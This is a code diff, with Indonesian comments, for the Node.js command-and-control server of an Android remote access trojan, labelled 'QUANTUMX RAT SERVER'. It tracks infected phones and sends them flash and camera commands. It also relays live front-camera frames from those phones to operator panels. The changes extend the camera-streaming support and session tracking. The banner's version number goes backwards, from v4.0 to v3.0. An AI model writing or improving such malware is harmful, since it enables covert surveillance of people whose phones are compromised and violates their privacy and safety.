@@ -10,13 +10,14 @@ const io = socketIo(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
-    }
+    },
+    maxHttpBufferSize: 1e8 // 100MB untuk gambar
 });
 
 // Middleware
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // ========== DATABASE ==========
 let users = [
@@ -31,7 +32,9 @@ let users = [
 let devices = new Map();
 let commands = new Map();
 let commandResults = new Map();
-let cameraSessions = new Map(); // Untuk tracking camera preview
+
+// Camera sessions tracking
+let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }
 
 // ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
@@ -114,16 +117,7 @@ app.get('/api/devices', authenticateToken, (req, res) => {
     res.json(deviceList);
 });
 
-// Get single device
-app.get('/api/device/:deviceId', authenticateToken, (req, res) => {
-    const device = devices.get(req.params.deviceId);
-    if (!device) return res.status(404).json({ error: 'Device not found' });
-    res.json(device);
-});
-
-// ========== COMMAND API ==========
-
-// Send command to device
+// Send command
 app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     const deviceId = req.params.deviceId;
     const { command, params } = req.body;
@@ -148,17 +142,23 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     
     const deviceName = devices.get(deviceId)?.deviceName || deviceId;
     
-    // LOG BERDASARKAN JENIS COMMAND
+    // Log berdasarkan tipe command
     if (command === 'flash') {
-        console.log(`⚡ [FLASH] -> ${deviceName} (${deviceId}) | DURATION: ${params.duration}s`);
+        console.log(`📸 [FLASH] SENT -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     } else if (command === 'camera_start') {
-        console.log(`📸 [CAMERA] START -> ${deviceName} (${deviceId}) | INTERVAL: ${params.interval}ms`);
-        cameraSessions.set(deviceId, { active: true, interval: params.interval });
+        console.log(`📷 [CAMERA] START REQUEST -> ${deviceName} (${deviceId})`);
+        
+        // Catat session camera
+        cameraSessions.set(deviceId, { active: true, timestamp: Date.now() });
+        
     } else if (command === 'camera_stop') {
-        console.log(`📸 [CAMERA] STOP -> ${deviceName} (${deviceId})`);
+        console.log(`📷 [CAMERA] STOP REQUEST -> ${deviceName} (${deviceId})`);
+        
+        // Hapus session camera
         cameraSessions.delete(deviceId);
-    } else {
-        console.log(`📤 [COMMAND] ${command.toUpperCase()} -> ${deviceName} (${deviceId})`);
+        
+    } else if (command === 'camera_frame') {
+        console.log(`📷 [CAMERA] FRAME REQUEST -> ${deviceName} (${deviceId})`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -185,44 +185,31 @@ app.post('/api/device/command/result', (req, res) => {
             completedAt: new Date().toISOString()
         });
         
-        io.emit('command-result', { commandId, deviceId, status, result });
+        io.emit('command-result', { commandId, deviceId, status, result, command: deviceCommands[commandIndex].command });
         
         const deviceName = devices.get(deviceId)?.deviceName || deviceId;
-        if (status === 'completed') {
-            if (deviceCommands[commandIndex].command === 'flash') {
+        
+        if (deviceCommands[commandIndex].command === 'flash') {
+            if (status === 'completed') {
                 console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
-            } else if (deviceCommands[commandIndex].command === 'camera_start') {
-                console.log(`✅ [CAMERA] STARTED -> ${deviceName}`);
-            } else if (deviceCommands[commandIndex].command === 'camera_stop') {
-                console.log(`✅ [CAMERA] STOPPED -> ${deviceName}`);
             } else {
-                console.log(`✅ [SUCCESS] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
+                console.log(`❌ [FLASH] FAILED -> ${deviceName}`);
             }
-        } else {
-            console.log(`❌ [FAILED] ${deviceCommands[commandIndex].command.toUpperCase()} -> ${deviceName}`);
+        } else if (deviceCommands[commandIndex].command === 'camera_start') {
+            if (status === 'completed') {
+                console.log(`✅ [CAMERA] STARTED -> ${deviceName}`);
+            } else {
+                console.log(`❌ [CAMERA] START FAILED -> ${deviceName}`);
+            }
+        } else if (deviceCommands[commandIndex].command === 'camera_stop') {
+            console.log(`✅ [CAMERA] STOPPED -> ${deviceName}`);
         }
     }
     
     res.json({ success: true });
 });
 
-// Get command result
-app.get('/api/command/:commandId/result', authenticateToken, (req, res) => {
-    const result = commandResults.get(req.params.commandId);
-    if (!result) return res.status(404).json({ error: 'Command result not found' });
-    res.json(result);
-});
-
-// Get pending commands
-app.get('/api/device/:deviceId/commands/pending', (req, res) => {
-    const deviceId = req.params.deviceId;
-    const deviceCommands = commands.get(deviceId) || [];
-    const pending = deviceCommands.filter(cmd => cmd.status === 'pending');
-    res.json(pending);
-});
-
 // ========== WEBSOCKET ==========
-
 io.on('connection', (socket) => {
     console.log(`🔌 [SOCKET] CONNECTED: ${socket.id}`);
     
@@ -238,6 +225,7 @@ io.on('connection', (socket) => {
         } = data;
         
         socket.deviceId = deviceId;
+        socket.deviceType = 'device';
         socket.join(deviceId);
         
         // Update atau simpan device dengan DATA LENGKAP
@@ -252,7 +240,7 @@ io.on('connection', (socket) => {
             device.batteryLevel = batteryLevel || device.batteryLevel;
             devices.set(deviceId, device);
         } else {
-            devices.set(deviceId, {
+            const deviceInfo = {
                 deviceId,
                 deviceName: deviceName || 'Unknown Device',
                 androidVersion: androidVersion || 'Unknown',
@@ -262,7 +250,8 @@ io.on('connection', (socket) => {
                 lastSeen: new Date().toISOString(),
                 online: true,
                 registeredAt: new Date().toISOString()
-            });
+            };
+            devices.set(deviceId, deviceInfo);
         }
         
         console.log(`📱 [DEVICE] ONLINE: ${deviceName} (${deviceId}) - ANDROID: ${androidVersion} - BATTERY: ${batteryLevel}%`);
@@ -308,21 +297,33 @@ io.on('connection', (socket) => {
     
     // ===== CAMERA FRAME DARI APK =====
     socket.on('camera-frame', (data) => {
-        const { deviceId, imageData } = data;
+        const { deviceId, imageData, timestamp } = data;
         
-        // Kirim ke semua panel yang subscribe
+        // Validasi device
+        if (!deviceId) return;
+        
+        // Update last seen device
+        if (devices.has(deviceId)) {
+            const device = devices.get(deviceId);
+            device.lastSeen = new Date().toISOString();
+            devices.set(deviceId, device);
+        }
+        
+        // Kirim frame ke semua panel yang sedang memantau device ini
+        // atau broadcast ke semua panel (bisa difilter nanti)
         io.emit('camera-frame', {
             deviceId,
             imageData,
-            timestamp: new Date().toISOString()
+            timestamp: timestamp || Date.now()
         });
         
-        console.log(`📸 [CAMERA] FRAME from ${deviceId} (${imageData.length} bytes)`);
+        console.log(`📸 [CAMERA FRAME] RECEIVED from ${deviceId} (${imageData ? imageData.length : 0} bytes)`);
     });
     
     // ===== PANEL CONNECT =====
     socket.on('panel-connect', () => {
         socket.isPanel = true;
+        socket.deviceType = 'panel';
         console.log(`🖥️ [PANEL] CONNECTED: ${socket.id}`);
     });
     
@@ -356,7 +357,19 @@ io.on('connection', (socket) => {
     });
 });
 
-// ========== STATS API ==========
+// ========== CAMERA STATUS ENDPOINT ==========
+app.get('/api/camera/status/:deviceId', authenticateToken, (req, res) => {
+    const deviceId = req.params.deviceId;
+    const isActive = cameraSessions.has(deviceId);
+    
+    res.json({
+        deviceId,
+        cameraActive: isActive,
+        lastFrame: isActive ? cameraSessions.get(deviceId).timestamp : null
+    });
+});
+
+// ========== STATS ==========
 app.get('/api/stats', authenticateToken, (req, res) => {
     const deviceList = Array.from(devices.values());
     const now = new Date();
@@ -373,20 +386,37 @@ app.get('/api/stats', authenticateToken, (req, res) => {
         onlineDevices: onlineCount,
         totalCommands: commandResults.size,
         pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
-        activeCameraSessions: cameraSessions.size
+        activeCameras: cameraSessions.size
     });
 });
 
-// ========== START SERVER ==========
+// Cleanup inactive camera sessions (setiap 5 menit)
+setInterval(() => {
+    const now = Date.now();
+    cameraSessions.forEach((session, deviceId) => {
+        // Hapus session yang sudah lebih dari 1 menit tidak ada aktivitas
+        if (now - session.timestamp > 60000) {
+            cameraSessions.delete(deviceId);
+            console.log(`🧹 [CLEANUP] Camera session expired: ${deviceId}`);
+        }
+    });
+}, 60000);
+
+// ========== START ==========
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => {
+server.listen(PORT, () => {
     console.log(`
-╔═══════════════════════════════════════╗
-║    QUANTUMX RAT SERVER v4.0           ║
-║    RUNNING ON PORT: ${PORT}                      ║
-║    WEBSOCKET: ws://localhost:${PORT}             ║
-║    API: http://localhost:${PORT}/api            ║
-║    FEATURES: FLASH + CAMERA PREVIEW    ║
-╚═══════════════════════════════════════╝
+╔═══════════════════════════════════════════════════╗
+║    QUANTUMX RAT SERVER v3.0                       ║
+║    RUNNING ON PORT: ${PORT}                                    ║
+║    WEBSOCKET: ws://localhost:${PORT}                           ║
+║    API: http://localhost:${PORT}/api                          ║
+║                                                     ║
+║    FEATURES:                                        ║
+║    • Flash Control ✅                               ║
+║    • Front Camera Screenshot ✅                     ║
+║    • Real-time Camera Frames ✅                     ║
+║    • WebSocket with auto-reconnect ✅               ║
+╚═══════════════════════════════════════════════════╝
     `);
 });
